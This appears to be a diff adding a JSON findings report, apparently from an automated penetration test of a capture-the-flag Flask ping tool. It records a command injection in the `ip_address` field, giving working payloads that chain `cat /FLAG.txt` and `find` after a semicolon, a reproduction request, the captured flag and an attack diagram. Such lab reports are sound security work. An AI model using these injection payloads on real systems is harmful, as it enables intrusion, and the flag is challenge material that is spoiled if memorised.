@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:47:58.904772+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "4a814dec-9bce-48b4-8221-5ed059fb3837",
+      "timestamp": "2026-04-12T21:47:58.904668+00:00",
+      "title": "OS Command Injection in Ping Tool (/ping)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48109/ping",
+      "description": "The Flask Ping Tool passes user-supplied input from the `ip_address` POST parameter directly into an OS shell command without sanitization. An attacker can append arbitrary shell commands using semicolons (`;`) or other shell metacharacters, achieving full Remote Code Execution (RCE) on the server.",
+      "evidence": "POST /ping with body `ip_address=127.0.0.1; cat /FLAG.txt` returned:\nflag{e10ecfcb-fa35-4d78-9b28-5e922c08349d}\n\nAlso confirmed: `ip_address=127.0.0.1; find / -name FLAG.txt` returned `/FLAG.txt`",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST http://172.17.0.1:48109/ping\nContent-Type: application/x-www-form-urlencoded\n\nip_address=127.0.0.1%3B+cat+/FLAG.txt",
+        "expected": "flag{e10ecfcb-fa35-4d78-9b28-5e922c08349d}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "52e7207b-0a97-499a-b9a6-d215b562c97f",
+      "timestamp": "2026-04-12T21:48:07.420217+00:00",
+      "title": "CTF Target Architecture",
+      "mermaid": "flowchart TD\n    Browser[\"Browser\"] -->|\"POST /ping ip_address=...\"| Flask[\"Flask App Werkzeug 3.0.6 Python 3.8.20\"]\n    Flask -->|\"os.system / subprocess shell=True\"| Shell[\"Shell Command: ping -c 2 {ip_address}\"]\n    Shell -->|\"Semicolon injection\"| RCE[\"RCE: cat /FLAG.txt\"]\n    RCE --> Flag[\"flag{e10ecfcb-fa35-4d78-9b28-5e922c08349d}\"]\n    Flask --> Static[\"/static/styles.css\"]\n    Flask --> PingEndpoint[\"/ping POST\"]\n    Flask --> IndexEndpoint[\"/ GET - Ping Form\"]"
+    }
+  ]
+}
